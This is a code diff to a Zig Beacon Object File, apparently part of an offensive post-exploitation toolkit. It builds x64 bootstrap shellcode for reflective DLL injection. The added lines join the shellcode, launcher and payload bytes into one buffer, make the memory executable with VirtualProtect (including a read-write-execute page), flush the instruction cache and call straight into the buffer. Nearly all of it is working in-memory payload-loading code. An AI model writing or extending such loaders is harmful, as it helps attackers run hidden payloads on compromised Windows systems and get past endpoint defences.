@@ -1,5 +1,7 @@
 const std = @import("std");
-const beacon = @import("bof_api").beacon;
+const bof_api = @import("bof_api");
+const beacon = bof_api.beacon;
+const w32 = bof_api.win32;
 const bof_launcher = @import("bof_launcher_api");
 
 pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
@@ -44,7 +46,7 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
 
-    const dll_offset: u32 = @intCast(@sizeOf(@TypeOf(bootstrap_bytes)) - bootstrap_i + rdi_shellcode_bytes.len);
+    const dll_offset: u32 = @intCast(@sizeOf(@TypeOf(bootstrap)) - bootstrap_i + rdi_shellcode_bytes.len);
 
     // pop rcx
     bootstrap_bytes[bootstrap_i] = 0x59;
@@ -159,7 +161,7 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     // call - Transfer execution to the RDI
     bootstrap_bytes[bootstrap_i] = 0xe8;
     bootstrap_i += 1;
-    bootstrap_bytes[bootstrap_i] = @intCast(@sizeOf(@TypeOf(bootstrap_bytes)) - bootstrap_i - 4); // Skip over the remainder of instructions
+    bootstrap_bytes[bootstrap_i] = @intCast(@sizeOf(@TypeOf(bootstrap)) - bootstrap_i - 4); // Skip over the remainder of instructions
     bootstrap_i += 1;
     bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
@@ -183,6 +185,32 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     // ret - return to caller
     bootstrap_bytes[bootstrap_i] = 0xc3;
     bootstrap_i += 1;
+
+    const shellcode_bytes = std.mem.concat(
+        std.heap.page_allocator,
+        u8,
+        &[_][]const u8{ bootstrap_bytes, rdi_shellcode_bytes, bof_launcher_bytes, bof_bytes },
+    ) catch return 249;
+    defer std.heap.page_allocator.free(shellcode_bytes);
+
+    var old_protection: w32.DWORD = 0;
+    if (w32.VirtualProtect(
+        shellcode_bytes.ptr,
+        shellcode_bytes.len,
+        w32.PAGE_EXECUTE_READ,
+        &old_protection,
+    ) == w32.FALSE) return 248;
+
+    if (w32.VirtualProtect(
+        shellcode_bytes.ptr,
+        4096,
+        w32.PAGE_EXECUTE_READWRITE,
+        &old_protection,
+    ) == w32.FALSE) return 247;
+
+    _ = w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, shellcode_bytes.len);
+
+    @as(*const fn () callconv(.C) void, @ptrCast(shellcode_bytes.ptr))();
 
     const exit_code = bof_launcher.run(bof_bytes) catch return 250;
     return exit_code + 5;
